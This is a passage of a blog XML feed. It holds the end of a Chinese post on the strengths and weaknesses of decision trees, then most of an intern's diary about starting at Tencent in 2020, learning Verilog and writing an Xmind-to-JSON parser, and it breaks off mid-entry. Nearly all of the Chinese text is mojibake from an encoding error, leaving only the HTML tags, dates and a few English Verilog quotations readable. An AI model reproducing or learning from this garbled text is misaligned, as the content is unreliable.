‡ç­¾åˆ†ç±»çš„é—®é¢˜åŒºåˆ«å¼€</p></li><li><p>æ˜¯ä¸€ä¸ªç™½ç›’æ¨¡å‹ï¼Œç»“æœå¾ˆå®¹æ˜“èƒ½å¤Ÿè¢«è§£é‡Šã€‚å¦‚æœåœ¨æ¨¡å‹ä¸­å¯ä»¥è§‚å¯Ÿåˆ°ç»™å®šçš„æƒ…å†µï¼Œåˆ™å¯ä»¥é€šè¿‡å¸ƒå°”é€»è¾‘è½»æ¾è§£é‡Šæ¡ä»¶ã€‚ç›¸åï¼Œåœ¨é»‘ç›’æ¨¡å‹ä¸­ï¼ˆä¾‹å¦‚ï¼Œåœ¨äººå·¥ç¥ç»ç½‘ç»œä¸­ï¼‰ï¼Œç»“æœå¯èƒ½æ›´éš¾ä»¥è§£é‡Šã€‚</p></li><li><p>å¯ä»¥ä½¿ç”¨ç»Ÿè®¡æµ‹è¯•éªŒè¯æ¨¡å‹ï¼Œè¿™è®©æˆ‘ä»¬å¯ä»¥è€ƒè™‘æ¨¡å‹çš„å¯é æ€§ã€‚</p></li><li><p>å³ä½¿å…¶å‡è®¾åœ¨æŸç§ç¨‹åº¦ä¸Šè¿åäº†ç”Ÿæˆæ•°æ®çš„çœŸå®æ¨¡å‹ï¼Œä¹Ÿèƒ½å¤Ÿè¡¨ç°è‰¯å¥½ã€‚</p></li></ol><p><strong>å†³ç­–æ ‘çš„ç¼ºç‚¹</strong></p><ol><li><p>å†³ç­–æ ‘å­¦ä¹ è€…å¯èƒ½åˆ›å»ºè¿‡äºå¤æ‚çš„æ ‘ï¼Œè¿™äº›æ ‘ä¸èƒ½å¾ˆå¥½åœ°æ¨å¹¿æ•°æ®ã€‚è¿™ç§°ä¸ºè¿‡åº¦æ‹Ÿåˆã€‚ä¿®å‰ªï¼Œè®¾ç½®å¶èŠ‚ç‚¹æ‰€éœ€çš„æœ€å°æ ·æœ¬æ•°æˆ–è®¾ç½®æ ‘çš„æœ€å¤§æ·±åº¦ç­‰æœºåˆ¶æ˜¯é¿å…æ­¤é—®é¢˜æ‰€å¿…éœ€çš„ï¼Œè€Œè¿™äº›å‚æ•°çš„æ•´åˆå’Œè°ƒæ•´å¯¹åˆå­¦è€…æ¥è¯´ä¼šæ¯”è¾ƒæ™¦æ¶©</p></li><li><p>å†³ç­–æ ‘å¯èƒ½ä¸ç¨³å®šï¼Œæ•°æ®ä¸­å¾®å°çš„å˜åŒ–å¯èƒ½å¯¼è‡´ç”Ÿæˆå®Œå…¨ä¸åŒçš„æ ‘ï¼Œè¿™ä¸ªé—®é¢˜éœ€è¦é€šè¿‡é›†æˆç®—æ³•æ¥è§£å†³ã€‚</p></li><li><p>å†³ç­–æ ‘çš„å­¦ä¹ æ˜¯åŸºäºè´ªå©ªç®—æ³•ï¼Œå®ƒé ä¼˜åŒ–å±€éƒ¨æœ€ä¼˜ï¼ˆæ¯ä¸ªèŠ‚ç‚¹çš„æœ€ä¼˜ï¼‰æ¥è¯•å›¾è¾¾åˆ°æ•´ä½“çš„æœ€ä¼˜ï¼Œä½†è¿™ç§åšæ³•ä¸èƒ½ä¿è¯è¿”å›å…¨å±€æœ€ä¼˜å†³ç­–æ ‘ã€‚è¿™ä¸ªé—®é¢˜ä¹Ÿå¯ä»¥ç”±é›†æˆç®—æ³•æ¥è§£å†³ï¼Œåœ¨éšæœºæ£®æ—ä¸­ï¼Œç‰¹å¾å’Œæ ·æœ¬ä¼šåœ¨åˆ†æè¿‡ç¨‹ä¸­è¢«éšæœºé‡‡æ ·ã€‚</p></li><li><p>æœ‰äº›æ¦‚å¿µå¾ˆéš¾å­¦ä¹ ï¼Œå› ä¸ºå†³ç­–æ ‘ä¸å®¹æ˜“è¡¨è¾¾å®ƒä»¬ï¼Œä¾‹å¦‚XORï¼Œå¥‡å¶æ ¡éªŒæˆ–å¤šè·¯å¤ç”¨å™¨é—®é¢˜ã€‚</p></li><li><p>å¦‚æœæ ‡ç­¾ä¸­çš„æŸäº›ç±»å ä¸»å¯¼åœ°ä½ï¼Œå†³ç­–æ ‘å­¦ä¹ è€…ä¼šåˆ›å»ºåå‘ä¸»å¯¼ç±»çš„æ ‘ã€‚å› æ­¤ï¼Œå»ºè®®åœ¨æ‹Ÿåˆå†³ç­–æ ‘ä¹‹å‰å¹³è¡¡æ•°æ®é›†ã€‚</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> æœºå™¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æœºå™¨å­¦ä¹  å¤§æ•°æ® pandas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é¹…åœºçš„æ—¥è®°</title>
      <link href="/2020/05/28/Tencent-intern-LOG/"/>
      <url>/2020/05/28/Tencent-intern-LOG/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ç¬”è€…ä¹‹å‰ä½¿ç”¨çš„Javaå±…å¤šï¼Œè¿›å…¥è…¾è®¯å®ä¹ å¾—è½¬C++ï¼Œå› æ­¤ç›¸å¯¹C++å·¥ç¨‹å¸ˆæ¥è¯´åŸºç¡€ä¸º0ã€‚æƒ³é€šè¿‡æ—¥è®°çš„æ–¹å¼è®°å½•è‡ªå·±çš„æˆé•¿å’Œç”Ÿæ´»çš„ä¸€äº›çäº‹ï¼Œäº‰å–è½¬æ­£ã€‚</p><span id="more"></span><!-- toc --><ul><li><a href="#2020520">2020&#x2F;5&#x2F;20</a></li><li><a href="#2020521">2020&#x2F;5&#x2F;21</a></li><li><a href="#2020522">2020&#x2F;5&#x2F;22</a></li><li><a href="#2020525">2020&#x2F;5&#x2F;25</a></li><li><a href="#2020526">2020&#x2F;5&#x2F;26</a></li><li><a href="#examples">Examples</a></li><li><a href="#2020527">2020&#x2F;5&#x2F;27</a></li><li><a href="#2020528">2020&#x2F;5&#x2F;28</a></li><li><a href="#2020529">2020&#x2F;5&#x2F;29</a></li><li><a href="#202061">2020&#x2F;6&#x2F;1</a></li><li><a href="#202062">2020&#x2F;6&#x2F;2</a></li><li><a href="#202063">2020&#x2F;6&#x2F;3</a></li><li><a href="#202064">2020&#x2F;6&#x2F;4</a></li><li><a href="#202065">2020&#x2F;6&#x2F;5</a></li><li><a href="#202068">2020&#x2F;6&#x2F;8</a></li><li><a href="#202069">2020&#x2F;6&#x2F;9</a></li><li><a href="#2020610">2020&#x2F;6&#x2F;10</a></li><li><a href="#2020611">2020&#x2F;6&#x2F;11</a></li></ul><!-- tocstop --><h2><span id="2020x2f5x2f20">2020&#x2F;5&#x2F;20</span></h2><p>â€‹åˆšåˆ°æ·±åœ³å°±ä¸‹é›¨äº†ï¼Œè·¯ä¸Šå¾ˆå¤šé»‘è½¦å¸æœºæ¼«å¤©è¦ä»·åˆ°é…’åº—è¦90ã€100ã€‚æˆ‘çœ‹äº†ä¸€çœ¼æ»´æ»´æ‰éœ€è¦50.æœæ–­é€‰æ‹©æ‰“æ»´æ»´ï¼Œä½†æ˜¯åé¢ä¸€ä¸ªé»‘è½¦è€æ¿é”²è€Œä¸èˆæŠ¥äº†ä¸ª60ï¼Œç„¶åæˆ‘æ„Ÿè§‰å·®ä¸å¤šå°±ç­”åº”äº†ï¼Œæ²¡æƒ³åˆ°ä¸€ä¸Šè½¦å°±ä¸‹é›¨äº†ï¼Œä¹Ÿæ˜¯è¿æ°”å¾ˆå¥½ã€‚è™½ç„¶è·¯ä¸Šè¿˜æäº†ä¸¤ä¸ªäººä½†æ˜¯å…ˆé€æˆ‘åˆ°é…’åº—ï¼Œä¸è¿‡é»‘è½¦ä¹Ÿæ²¡é€åˆ°é…’åº—é—¨å£ã€‚åˆ°é…’åº—åèµ°å®Œæµç¨‹ï¼Œå®Œæˆçº¿ä¸Šçš„ç­¾çº¦å°±é™ç­‰è…¾è®¯é‚£è¾¹æµç¨‹ï¼Œæ™šäº›æ—¶å€™æ‰“äº†ä¸€ä¼šæ— é™ç«åŠ›ã€‚</p><h2><span id="2020x2f5x2f21">2020&#x2F;5&#x2F;21</span></h2><p>â€‹hråŠ©æ‰‹ä¸Šæ˜¾ç¤ºé€šè¡Œç æ˜å¤©æ‰ä¼šç»¿ï¼Œä»Šå¤©å»ä¸äº†å…¬å¸äº†ã€‚æœæ–­å»Bç«™æŠŠå°ç¨‹åºå‰©ä¸‹çš„å†…å®¹å­¦ä¹ å®Œã€‚</p><h2><span id="2020x2f5x2f22">2020&#x2F;5&#x2F;22</span></h2><p>â€‹ä»Šå¤©èµ·äº†ä¸ªå¤§æ—©ï¼Œæ˜¨å¤©æ™šä¸Šçœ‹åœ°å›¾æ˜¾ç¤ºåˆ°å…¬å¸å·®ä¸å¤š30åˆ†é’Ÿï¼Œç„¶åææ—©èµ·æ¥ï¼Œåƒå®Œé¥­å°±å»ç­‰å…¬äº¤äº†ï¼Œæ²¡æƒ³åˆ°è·¯ä¸Šé‚£ä¸ªå µå•Šï¼Œ1å°æ—¶æ‰èµ°å®Œ4å…¬é‡Œçš„è·¯ã€‚å¿ƒæ€å‘ç”Ÿäº†ç‚¹å˜åŒ–ï¼Œå¥½åœ¨ä¸‹è½¦ç‚¹ç¦»è…¾è®¯å¤§å¦å¾ˆè¿‘ã€‚é¢†å®Œäº†ä¸´æ—¶å·¥ç‰Œä¸Šæ¥¼æ‹¿åˆ°äº†æ­£å¼å‘˜å·¥çš„å·¥ç‰Œï¼Œç„¶ååœ¨29æ¥¼ç­‰åˆ°äº†äº²çˆ±çš„å¯¼å¸ˆSongaåï¼Œå¯¼å¸ˆç»™æˆ‘å®‰æ’äº†å·¥ä½ï¼Œç”±äºäººæ¯”è¾ƒå¤šç»™æˆ‘å®‰æ’çš„æ˜¯ä¸ªä¸´æ—¶çš„å·¥ä½ã€‚ä¸è¿‡è…¾è®¯çš„æ¤…å­åèµ·æ¥è¿˜æ˜¯æ¯”è¾ƒniceçš„ã€‚</p><p><img src="/2020/05/28/Tencent-intern-LOG/2e51e8d8f26e43a3f79bf461582f347.jpg" alt="å·¥ä½ç”µè„‘"></p><p>â€‹æ—©ä¸Šä¸»è¦æ˜¯ç†Ÿæ‚‰ä¸€ä¸‹å…¬å¸ç¯å¢ƒè¿˜æœ‰å°†å…¬å¸é…çš„ç”µè„‘è¿›è¡Œæ ‡å‡†åŒ–è®¾ç½®ã€‚ç”µè„‘é…ç½®è¿˜è›®ä¸é”™çš„i7 9700+32G+1TSSDï¼Œå…¬å¸ç½‘ä¹Ÿæ˜¯æå¿«çš„ï¼Œæˆ‘å°±è£…ä¸Šäº†chromeå¼€å§‹ä½¿ç”¨Googleï¼Œæ„Ÿè§‰çœŸçš„å®Œçˆ†äº†ç™¾åº¦ã€‚åé¢å¯¼å¸ˆè®©æˆ‘ç ”ç©¶ä¸€ä¸‹Xilinx U20çš„å¡ï¼ˆFPGAæ¶æ„ï¼‰ï¼Œä»¥åŠæ™ºèƒ½çš„ç½‘å¡DPDKã€‚</p><p>â€‹å¾ˆå¿«å°±åˆ°ä¸­åˆäº†ï¼Œå¯¼å¸ˆä¹Ÿæ˜¯å¾ˆniceçš„å’Œæˆ‘åƒäº†ä¸€ä¸‹åˆé¥­ï¼Œç„¶åå¸¦æˆ‘æºœè¾¾äº†ä¸€åœˆï¼Œè¿˜å»äº†28æ¥¼é¢†å–äº†è…¾è®¯å‘çš„å£ç½©ï¼Œè¿˜æ˜¯æ¯”äºšè¿ªç”Ÿäº§çš„ã€‚</p><p><img src="/2020/05/28/Tencent-intern-LOG/0aa79f15a16da0334e10cfedf1c85b5.jpg" alt="å£ç½©"></p><p>â€‹åƒå®Œé¥­å°±å¯ä»¥ä¼‘æ¯äº†ï¼Œä¸€èˆ¬å¤§å®¶ä»11:30å°±å¯ä»¥å‡†å¤‡å»åƒé¥­äº†ï¼Œç„¶åä¸­åˆå¯ä»¥ä¼‘æ¯åˆ°2ç‚¹ï¼Œä¸»è¦æˆ‘ä¹Ÿæ¯”è¾ƒéš¾ä»¥å…¥ç¡ï¼Œä¸€å¤©é ä¸¤æ¯æ‹¿é“åº¦è¿‡äº†ã€‚åé¢Leaderä¹Ÿæ˜¯å¸¦æˆ‘å»è§äº†ä¸€é¢æ€»ç›‘ï¼Œç„¶åç»™æˆ‘ä»‹ç»äº†ä¸€ä¸‹ç»„é‡Œé¢çš„æƒ…å†µï¼Œä»¥åŠ30TB&#x2F;sæµé‡çš„ç›‘æ§å¹³å°â€”â€”å¤©å¹•ï¼Œç›‘æ§äº†è…¾è®¯ç™¾åˆ†ä¹‹98çš„æµé‡ï¼Œå¯è°“æ˜¯ååˆ†å¼ºå¤§äº†ã€‚åé¢å’Œå¯¼å¸ˆäº¤æµäº†ä¸€ä¸‹æˆ‘çš„åŸ¹å…»è®¡åˆ’ï¼Œå‘ç°å°ç¨‹åºé‚£éƒ¨åˆ†å†…å®¹å…¶å®æœ‰å›¢é˜Ÿåšå®Œäº†ã€‚çœ‹æ¥æˆ‘å¿…é¡»ç›´é¢æˆ‘æœ€è–„å¼±çš„ç‚¹ã€‚æˆ‘æœ¬æ¥æ˜¯åšJavaåä¸Šå±‚åº”ç”¨çš„ï¼Œæ²¡æƒ³åˆ°è¦è½¬C++æ¥å¼€å‘åº•å±‚çš„ç¡¬ä»¶äº†ã€‚è€Œä¸”å…¨ç»„å”¯ä¸€æœ‰FPGAç»éªŒçš„å¤§ä½¬è¿˜è¢«å½“ä½œæ•‘å…µå»æ•‘æ€¥äº†ã€‚ å“ˆå“ˆå“ˆï¼Œå¦‚æœè½¬å‹æˆåŠŸé‚£å°±ç›¸å½“äºå‡¤å‡°æ¶…æ§ƒäº†ï¼Œæ—¢æ˜¯æœºé‡ä¹Ÿæ˜¯æŒ‘æˆ˜ã€‚</p><p>â€‹å› æ­¤æˆ‘ç¬¬ä¸€å¤©å…¶å®æ„Ÿå—åˆ°å‹åŠ›è¿˜æ˜¯è›®å¤§çš„ï¼Œç„¶åç¬¬ä¸€å¤©å°±æ”¶åˆ°äº†ä¸‹åˆèŒ¶çš„ç¦åˆ©ï¼Œå¯¼å¸ˆç»™äº†æˆ‘ä¸€ä»½æ°´æœæä¸€ä»½ç”˜éœ²ï¼Œçœ‹æ¥é¹…åœºç¦åˆ©è¿˜æ˜¯åä¸è™šä¼ çš„ã€‚é™¤æ­¤ä¹‹å¤–è¿˜æœ‰æŠ«è¨å’Œé¸¡å—å“ˆå“ˆå“ˆã€‚æ–‡å…·ã€çº¸å·¾å•¥çš„ä¹Ÿæ˜¯éšä¾¿æ‹¿ï¼Œæ€»çš„æ¥è¯´è…¾è®¯æä¾›äº†ä¸€ä¸ªç‰¹åˆ«Niceçš„å·¥ä½œç¯å¢ƒå’Œå·¥ä½œæ°›å›´ï¼Œå¦‚æœé€‚åº”äº†å…¶å®æ„Ÿè§‰ä¸åˆ°ç´¯ã€‚</p><p><img src="/2020/05/28/Tencent-intern-LOG/image-20200523100708719.png" alt="ä¸‹åˆèŒ¶"></p><p><img src="/2020/05/28/Tencent-intern-LOG/image-20200523100747548.png" alt="ç¦åˆ©"></p><p>â€‹è™½ç„¶åšçš„ä¸œè¥¿æˆ‘éƒ½æ²¡æœ‰ä»»ä½•çš„ç»éªŒï¼Œæˆ‘è¿˜æ˜¯ç›¸ä¿¡è‡ªå·±çš„æ”»åšèƒ½åŠ›çš„ï¼Œå¥½å¥½åŠ æ²¹äº‰å–èƒ½å…ˆå…¥ä¸ªé—¨ï¼Œç­‰å…¥é—¨äº†å°±ä¼šè½»æ¾ä¸€ç‚¹äº†ã€‚</p><p>â€‹åé¢æ˜¯æ‰“ç®—å·¥ä½œåˆ°8ç‚¹åç„¶ååœ¨å…¬å¸é‡Œé¢å¥èº«ï¼Œç„¶åæ‰“è½¦å›å®¶å’¯ï¼Œä»Šå¤©å’Œå¥½åŸºå‹å‡ºå»æ°äº†ä¸ªé¥­ç„¶åå°±å›æ¥äº†ã€‚</p><p>â€‹è¦è¯´ä¸€ç‚¹ä¼ä¸šå¾®ä¿¡è¿˜æ˜¯æ¯”é’‰é’‰äººæ€§åŒ–ï¼Œè™½ç„¶è¯´é’‰é’‰æ˜¯ä¸ºä¼ä¸šæœåŠ¡å®Œå…¨ä¸éœ€è¦è€ƒè™‘ä½ å‘˜å·¥çš„ä½“éªŒï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯æ¯”è¾ƒå–œæ¬¢è…¾è®¯çš„ä¼ä¸šå¾®ä¿¡çš„ï¼Œå¤šäº†ä¸€äº›äººæ€§çš„å…³æ€€å§ã€‚</p><p>â€‹è…¾è®¯çš„ç‘é›ªæ–‡åŒ–æˆ‘ä¹Ÿç‰¹åˆ«çš„å–œæ¬¢ï¼Œç›¸æ¯”ç™¾åº¦å…¶å®æˆ‘å¿ƒä¸­çš„Dream Companyå°±æ˜¯è…¾è®¯äº†ã€‚å¸Œæœ›è‡ªå·±èƒ½å°½å¿«çš„èå…¥å›¢é˜Ÿå§ã€‚</p><h2><span id="2020x2f5x2f25">2020&#x2F;5&#x2F;25</span></h2><ul><li><p>æ—©ä¸Šå»æ»¨æµ·å¤§å¦é€åˆåŒï¼Œé¡ºä¾¿å‚è§‚äº†ä¸€ä¸‹å¤§æ¥¼ã€‚</p></li><li><p>è°ƒç ”FPGAçš„æ•°å­—ç”µè·¯è®¾è®¡è¯­è¨€ï¼ˆåˆ†åˆ«æœ‰Verilog HDLå’ŒVHDLï¼Œå›½å†…å’Œæ¬§ç¾ä½¿ç”¨Verilogæ¯”è¾ƒå¤šï¼Œæ¬§æ´²ä½¿ç”¨VHDLæ¯”è¾ƒå¤šã€‚é€šå¸¸åœ¨å°å‹ä¸­å‹è®¾è®¡çš„æ—¶å€™ä½¿ç”¨Verilogï¼Œå› ä¸ºå…¶ç‰¹æ€§æ¯”è¾ƒçµæ´»ã€‚åœ¨å¤§å‹çš„è®¾è®¡ä¸­ä½¿ç”¨VHDLæ¯”è¾ƒå¤šï¼Œå› ä¸ºå…¶ä»¥ä¸¥è°¨æ€§è‘—ç§°ã€‚ï¼‰</p></li><li><p>ä½¿ç”¨æœç´¢å¼•æ“æœç´¢ç›¸å…³æ•™ç¨‹,å¼€å§‹å­¦ä¹ Verilog HDLè¯­è¨€ã€‚</p><blockquote><p>â€‹å­¦ä¹ äº†ä»€ä¹ˆæ˜¯Verilog HDL</p><p>â€‹å­¦ä¹ äº†æ¨¡å—ã€æ—¶å»¶å’Œè®¾è®¡çš„è¡¨è¿°æ–¹å¼</p><p>â€‹å­¦ä¹ äº†æ ‡è¯†ç¬¦ã€æ³¨é‡Šã€æ ¼å¼ã€ç¼–è¯‘å‘½ä»¤å’Œç³»ç»Ÿä»»åŠ¡ä¸å‡½æ•°</p></blockquote></li><li><p>äº†è§£Xmindåå°é¡¹ç›®</p></li><li><p>ç ”ç©¶äº†Xmindçš„pythonåŒ…ï¼Œä½†æ˜¯å­˜åœ¨ç€æ— æ³•å’Œæœ€æ–°ç‰ˆxmindè½¯ä»¶å…¼å®¹çš„é—®é¢˜ã€‚</p></li><li><p>æ™šä¸Šå®åœ°æ¢å‹˜äº†ç­è½¦ï¼Œå¹¶ä½“éªŒäº†è…¾è®¯ç­è½¦ã€‚</p></li></ul><h2><span id="2020x2f5x2f26">2020&#x2F;5&#x2F;26</span></h2><ul><li><p>å­¦ä¹ Verilog HDLè¯­è¨€</p><blockquote><p>å­¦ä¹ äº†å€¼é›†åˆã€æ•°æ®ç±»å‹ã€è¡¨è¾¾å¼ã€é—¨ç”µå¹³æ¨¡å‹åŒ–ã€‚</p></blockquote><p>è®°å½•ä¸€ä¸‹Verilogè¯­è¨€ä¸­çš„ reg[MSB:LSB] aï¼Œå…¶ä¸­aå¯„å­˜å™¨çš„ä½æ•°ä¸ºMSB-LSB+1ï¼Œä¸”å…¶ä¸­çš„aæ˜¯æ— ç¬¦å·æ•´æ•°ï¼Œå¼•ç”¨å®˜ç½‘æ–‡æ¡£ï¼š</p><p>Vectors can be declared for all types of <strong>net</strong> data types and for <strong>reg</strong> data types. Specifying vectors for <strong>integer</strong>, <strong>real</strong>, <strong>realtime</strong>, and <strong>time</strong> data types is illegal.</p><h2><span id="examples">Examples</span></h2><p>Example 1</p><p><strong>reg</strong> [3:0] addr;</p><p>The â€˜addrâ€™ variable is a 4-bit vector register made up of addr[3] (the most significant bit), addr[2], addr[1], and addr[0] (the least significant bit).</p><p>Example 2</p><p><strong>wire</strong> [-3:4] d;</p><p>The d variable is 8-bit vector net made up of d[-3] (msb), d[-2], d[-1], d[0], d[1], d[2], d[3], d[4] (lsb).</p><p>Example 3</p><p><strong>tri</strong> [5:0] x, y, z;</p><p>The above line declares three 6-bit vectors.   </p><p>è®°å½•ä¸€ä¸‹assignçš„æ„ä¹‰ï¼Œæœ‰æ—¶å€™ç”¨assignæœ‰æ—¶å€™ç›´æ¥èµ‹å€¼ï¼š</p><blockquote><p>The <strong>assign</strong> construct in Verilog is the <strong>continuous</strong> assignment statement in Verilog which is used in <strong>dataflow</strong> modelling.</p></blockquote></li><li><p>å…¬å¸çš„ç½‘å¥½åƒç”¨pipå’Œnpmä¸‹è½½ä¸€äº›åŒ…ä»¥åŠå®‰è£…ä¸€äº›è½¯ä»¶éƒ½è£…ä¸ä¸Šã€‚</p></li><li><p>ä¸‹åˆå¼€å§‹è®¤çœŸçœ‹Xmindé¡¹ç›®çš„éœ€æ±‚ï¼Œä¸€å¼€å§‹æ²¡ä»€ä¹ˆå¤´ç»ªï¼Œæ™šä¸Šå†™å®Œä»£ç æµ‹è¯•äº†ä¸€ä¸‹å±‚æ¬¡éå†å’Œå‰åºéå†ï¼Œå†³å®šä½¿ç”¨å±‚æ¬¡éå†çš„æ–¹æ³•ã€‚</p></li><li><p>æ™šä¸Šæƒ³åˆ°æ–¹æ³•åä¸€ç›´ç¡ä¸ç€ï¼Œè®°å½•äº†ä¸€ä¸‹æ‰€æ€è€ƒçš„æ€è·¯ã€‚</p></li></ul><h2><span id="2020x2f5x2f27">2020&#x2F;5&#x2F;27</span></h2><ul><li><p>æ—©ä¸Šè¿˜æ˜¯æ—©æ—©çš„èµ·æ¥æ­ä¹˜ç­è½¦åˆ°å…¬å¸</p></li><li><p>ä¸€è¾¹è°·æ­Œä¸€è¾¹codingæŠŠæˆ‘çš„æƒ³æ³•å®ç°äº†ï¼Œåº”è¯¥æ˜¯é—®é¢˜ä¸å¤§ã€‚</p></li><li><p>ä¸‹åˆï¼Œæ„æ€äº†ä¸€ä¸‹å¤æ‚æ¨¡æ¿çš„è®¾è®¡å’Œè§„èŒƒï¼Œæœ€ç»ˆå®ç°äº†ä¸€ä¸ªdemo</p><p><img src="/2020/05/28/Tencent-intern-LOG/image-20200527213647495.png" alt="ç®€åŒ–ç‰ˆxmind"></p><p><img src="/2020/05/28/Tencent-intern-LOG/image-20200527213710782.png" alt="å¤„ç†å®Œçš„ç»“æœ"></p><p><img src="/2020/05/28/Tencent-intern-LOG/image-20200527213736644.png" alt="å¤æ‚ç‰ˆæœ¬xmind"></p><p><img src="/2020/05/28/Tencent-intern-LOG/image-20200527213757782.png" alt="å¤„ç†åçš„ç»“æœ"></p></li><li><p>ç»§ç»­å­¦ä¹ Verilog</p><blockquote><p> ç»„åˆç”µè·¯ä¸æ—¶åºç”µè·¯</p></blockquote></li><li><p>æ™šä¸Šå’Œä¸­å¿ƒçš„äººæ‰“ç¯®çƒï¼Œæ‰“å®Œåä¸€èº«æ±—ä¸æ–¹ä¾¿åå¤§å·´ç´¢æ€§éª‘è½¦å›é…’åº—</p></li><li><p>æ„Ÿè§‰è¿™æ ·çš„ç”Ÿæ´»è¿˜æ˜¯è›®èˆ’æœçš„ï¼Œè™½ç„¶è¯´å¤§åŸå¸‚ç»™äºˆè‡ªå·±çš„æ—¶é—´å˜å°‘äº†ï¼Œä½†æ˜¯å…¬å¸çš„æ°›å›´éƒ½ç‰¹åˆ«èæ´½ï¼Œæ…¢æ…¢æ„Ÿå—åˆ°äº†ç‘é›ªæ–‡åŒ–ã€‚è¶Šå‘çš„æƒ³ç•™åœ¨è…¾è®¯äº†ï¼Œæˆ‘ä¹Ÿæ˜¯è¶Šæ¥è¶Šå¥½ï¼Œè¶Šæ¥è¶Šè‡ªä¿¡äº†ã€‚</p></li></ul><h2><span id="2020x2f5x2f28">2020&#x2F;5&#x2F;28</span></h2><ul><li><p>æŒ‰ç…§éœ€æ±‚ä¿®æ”¹Xmind</p><blockquote><p>ä¿®æ”¹äº†ä»£ç å®ç°æ ‡ç­¾è¿½åŠ åŠŸèƒ½</p><p>å¢åŠ äº†é»˜è®¤æƒé™ä¸º0çš„æ“ä½œ</p><p>ä¿®æ”¹ä»£ç å®ç°äº†æŒ‰é¡ºåºæ·»åŠ å±æ€§åŠŸèƒ½</p><p>å®ç°äº†åŒºåˆ†ç”¨ä¾‹æ ‡é¢˜å’Œå±æ€§</p></blockquote><p>ä½†æ˜¯å¾ˆé—æ†¾çš„æ˜¯xmindåŒ…ä¸æ”¯æŒxmind zenç‰ˆæœ¬</p><p>å› æ­¤æˆ‘å†³å®šæ”¹å˜ä¸€ä¸ªæ€è·¯ï¼Œå»æ‰¾æœ‰æ²¡æœ‰å°†zenè½¬ä¸ºjsonçš„åŒ…ï¼Œå¹¶ä¸”å¯¹jsonè¿›è¡Œå±‚æ¬¡éå†ï¼Œè¿™æ ·è™½ç„¶æ•ˆç‡ä½äº†ä½†æ˜¯ä¹Ÿèƒ½å®ç°åŠŸèƒ½ï¼Œä»£ç ä¹Ÿå¯ä»¥å¤ç”¨ã€‚</p></li><li><p>ç»§ç»­å­¦ä¹ Verilog</p><blockquote><p>æ•°æ®æµæ¨¡å‹åŒ–</p></blockquote></li><li><p>é¡¹ç›®ç»ç†è®©æˆ‘å¸®é»„åšå¯¹æ¥ä¸€ä¸‹AI LAB</p></li><li><p>æ™šä¸Šå¥èº«+éª‘è½¦å›é…’åº—</p></li></ul><h2><span id="2020x2f5x2f29">2020&#x2F;5&#x2F;29</span></h2><ul><li>ç»§ç»­ç ”ç©¶å¦‚ä½•è§£æXmind</li><li>æ”¾å¼ƒäº†è‡ªå·±å†™çš„è§£æä»£ç ï¼ŒæŸ¥è¯¢äº†ç›¸å…³æ–‡æ¡£ä½¿ç”¨äº†jsonåº“è‡ªå¸¦çš„åŠŸèƒ½ã€‚</li><li>å®Œæˆäº†å¯¹JSONçš„è§£æï¼Œå¹¶ä¸”å°†ç»“æœå°è£…æˆå¯¹è±¡ã€‚</li><li>é»˜è®¤ä¸€ä¸ªZENæ–‡æ¡£ä¸€ä¸ªç”»å¸ƒ</li><li>ä¸ºäº†ä»£ç å¯è¯»æ€§ã€ç»´æŠ¤æ€§å’Œå¼€å‘çš„ä¾¿æ·æ€§ï¼Œç‰ºç‰²ä¸€ä¸¢ä¸¢æ€§èƒ½ï¼Œå°†è§£æXmindå•ç‹¬å†™æˆä¸€ä¸ªæ–‡ä»¶ã€‚</li><li>å®Œæˆå¯¹JSONæ–‡ä»¶çš„è§£æç”Ÿæˆæ¨¡å‹èŠ‚ç‚¹ï¼Œå¹¶ä¸”å¯¹æ¨¡å‹èŠ‚ç‚¹è§£æï¼Œç»“åˆæˆ‘ä¹‹å‰çš„è§£æä»£ç æŠŠæ•´ä¸ªXmindæ–‡ä»¶æŒ‰æ ¼å¼è§£æå‡ºæ¥ã€‚</li></ul><h2><span id="2020x2f6x2f1">2020&#x2F;6&#x2F;1</span></h2><ul><li><p>ç»§ç»­å­¦ä¹ Verilog</p><blockquote><p> å­¦ä¹ äº†è¡Œä¸ºå»ºæ¨¡ ç»“æ„å»ºæ¨¡</p></blockquote></li><li><p>Xmind è§£æé¡¹ç›®</p><blockquote><p>ä¼˜åŒ–Xmindè§£æç®—æ³•ï¼Œæ·»åŠ æ³¨é‡Šï¼ŒåŠ å…¥å¤šç”»å¸ƒæ”¯æŒã€‚</p><p>åˆ é™¤å†—ä½™ä»£ç ï¼Œå‡å°‘ç©ºé—´å¤æ‚åº¦ã€‚</p><p>å¼€ä¼šè®¨è®ºä¸‹ä¸€æ­¥è®¡åˆ’ï¼š</p></blockquote><blockquote><pre><code>    1.  è§£æç›®å½•    2.  è½¬æ¢æˆå…¶ä»–å¯¹è±¡    3.  å®¹é”™å’Œæ ¡éªŒ</code></pre></blockquote></li><li><p>å®Œæˆè§£æç›®å½•å’Œç»“æœé›†è½¬åŒ–ä¸ºNodeDOListå¯¹è±¡ï¼Œå…ƒç´ è½¬åŒ–ä¸ºNodeDOå¯¹è±¡ã€‚</p></li></ul><h2><span id="2020x2f6x2f2">2020&#x2F;6&#x2F;2</span></h2><ul><li><p>Xmindè§£æï¼š</p><blockquote><p>ä¿®å¤äº†å¤šæ¬¡è®¾ç½®å±æ€§çš„bug</p><p>æ·»åŠ äº†å¯¹ä¼˜å…ˆçº§çš„åˆ¤é”™ï¼š</p><p>â€‹å¦‚æœæ˜¯påæ•°å­—å¤§äº3å°äº0å°±æŠ¥é”™</p><p>â€‹å¦‚æœæ˜¯æ ‡ç­¾æ²¡åŠ #åˆ™åˆ¤é”™ï¼Œå¦‚æœåœ¨ä¼˜å…ˆçº§åå†™æ ‡ç­¾æ²¡åŠ |åˆ™æŠ¥é”™</p><p>å®¹é”™ï¼š</p><p>â€‹å¦‚æœæ˜¯å°å†™på¼€å¤´å°±è½¬åŒ–æˆå¤§å†™P</p><p>ä¼˜åŒ–äº†ä»£ç 